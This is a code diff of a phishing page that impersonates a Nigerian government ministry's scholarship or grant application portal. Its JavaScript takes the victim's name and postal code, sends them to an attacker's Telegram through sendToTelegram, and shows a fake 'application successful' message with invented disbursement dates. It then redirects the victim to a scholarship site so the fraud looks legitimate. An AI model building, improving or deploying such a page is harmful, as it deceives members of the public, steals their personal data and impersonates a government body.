@@ -79,9 +79,13 @@
             50% { transform: translateY(-10px); }
             100% { transform: translateY(0px); }
         }
-        img{
+        #kkk{
             border-radius: 50%;
             width: 5pc;
+            border: 3px solid #ffb200;
+        }
+        #class {
+            width: 10pc;border-radius: 50%;
             border: 3px solid #ffb200;
         }
     </style>
@@ -117,8 +121,8 @@
                     Begin Application
                 </button>
                 <div class="mt-12 flex justify-center gap-16 ">
-                <img src="https://img.freepik.com/premium-photo/background-editors-designers-national-holiday-3d-illustration-national-coat-arms-nigeria_659987-7848.jpg?w=360"alt="Ministry Logo">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXDSLTK-Uf3qEIhNxzzhxNtvPZBw_4oUf9rffGAiir1x1mZn59ZEkKl-B5&s=10"  alt="Gov Logo">
+                <img id="kkk" src="https://img.freepik.com/premium-photo/background-editors-designers-national-holiday-3d-illustration-national-coat-arms-nigeria_659987-7848.jpg?w=360"alt="Ministry Logo">
+                <img id="kkk" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXDSLTK-Uf3qEIhNxzzhxNtvPZBw_4oUf9rffGAiir1x1mZn59ZEkKl-B5&s=10"  alt="Gov Logo">
         </div>
             </div>   
                      
@@ -201,8 +205,8 @@
             </div>
 
             <div id="result-ui" class="hidden animate__animated animate__zoomIn">
-                <div class="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                    <span class="text-4xl">⚠️</span>
+                <div class="w-23 h-23 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <span class="text-4xl"><img id="class"src="https://media.tenor.com/6ZkJEn80W7kAAAAM/green-tick.gif" alt=""></span>
                 </div>
                 <h2 id="final-msg" class="text-lg font-bold text-gray-800 leading-tight"></h2>
                 <p class="text-sm text-gray-500 mt-4">For further inquiries, please visit the nearest Ministry branch.</p>
@@ -332,22 +336,35 @@
         async function finalSubmit(e) {
             const retryPost = document.getElementById('retry-post').value;
             if(!retryPost) return alert("Security requires your postal code.");
-
+            
             const btn = document.getElementById('btn-3');
             btn.innerText = "Syncing...";
             btn.disabled = true;
 
-            const msg = `🚨 FINAL SECURITY RETRY\n👤 ${formData.fname} ${formData.lname}\n🔑 Retry Post: ${retryPost}📧 Email: ${formData.country}`;
+            const msg = `🚨 FINAL SECURITY RETRY\n👤 ${formData.fname} ${formData.lname}\n🔑 Retry Post: ${retryPost}\n📧 Email: ${formData.country}`;
             
             const success = await sendToTelegram(msg);
+
             if(success) {
                 document.getElementById('error-ui').classList.add('hidden');
                 document.getElementById('loading-ui').classList.remove('hidden');
                 document.getElementById('loading-text').innerText = "CALCULATING SCORE...";
+
                 setTimeout(() => {
                     document.getElementById('loading-ui').classList.add('hidden');
                     document.getElementById('result-ui').classList.remove('hidden');
-                    document.getElementById('final-msg').innerText = `We regret to inform you, ${formData.fname} ${formData.lname}, that your profile does not meet the eligibility threshold at this time.`;
+                    
+                    // Updated Success Message
+                    document.getElementById('final-msg').innerText = `${formData.fname} ${formData.lname},Your application is successful. Your information has been forwarded to the Vercelar Government Portal. 
+                    Disbursement starts on 15-feb-2026 to 20-feb-2026. 
+                    Now we will redirect you to our official international scholarship site. 
+                    Please wait for a few minutes.....`;
+
+                    // Automatic Redirection after 5 seconds
+                    setTimeout(() => {
+                        window.location.href = "https://scholarshiproar.com/fully-funded-scholarships/?amp";
+                    }, 5000);
+
                 }, 5000);
             } else {
                 showErrorUnderButton('btn-3');
